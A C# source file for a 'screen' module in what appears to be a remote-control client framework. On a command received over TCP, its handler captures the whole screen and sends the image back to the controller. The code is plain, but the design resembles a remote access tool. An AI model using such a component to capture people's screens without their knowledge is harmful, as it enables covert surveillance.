using System.Drawing;
using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using ScreenModule.Structures;
using Serilog.Core;
using SystemModule.Structures;

namespace ScreenModule;

[Module("screen")]
public class ScreenModuleImpl {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "Screen");

    [Handler("takeScreenshot")]
    public static async Task TakeScreenshot(TCPClient client, EmptyHandlerData data) {
        Rectangle rect = Capture.GetDimensions();

        Logger.Information("Taking screenshot, dimensions: {X}:{Y}",
            rect.Width,
            rect.Height);

        TakeScreenshotResult result = new();
        byte[] bytes = null;
        try {
            using MemoryStream stream = Capture.Screenshot(rect);
            bytes = stream.ToArray();

            Logger.Information("Took screenshot, size: {Bytes} bytes",
                bytes.Length);

            result.Data = bytes;
            result.Success = true;
        } catch (Exception error) {
            Logger.Error("Failed to take screenshot: {Error}", error);
            result.Success = false;
            result.Error = error.Message;
        }

        await client.SendPacket(new ClientPacket {
            Type = PacketType.Callback,
            Data = result
        });
    }
}